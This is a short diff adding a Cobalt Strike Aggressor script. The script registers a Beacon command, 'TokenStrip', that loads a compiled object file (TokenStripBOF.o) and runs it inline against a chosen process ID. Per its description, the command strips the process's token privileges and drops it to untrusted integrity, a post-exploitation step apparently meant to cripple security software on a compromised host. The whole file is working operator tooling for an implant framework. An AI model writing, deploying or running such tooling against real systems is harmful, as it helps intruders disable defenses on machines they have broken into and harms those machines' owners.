@@ -1,0 +1,21 @@
+beacon_command_register(
+    "TokenStrip", 
+    "Deletes token privileges and lowers integrity level to untrusted for a specified process", 
+    "Synopsis: TokenStrip PID"
+);
+
+alias TokenStrip {
+    if(size(@_) != 2)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("TokenStrip"));
+        return;
+    }
+    local('$handle $data $args');
+    $handle = openf(script_resource("TokenStripBOF.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $args = bof_pack($1, "i",$2);
+    btask($1, "TokenStrip BOF (github.com/nick-frischkorn)");
+    beacon_inline_execute($1, $data, "go", $args);
+}
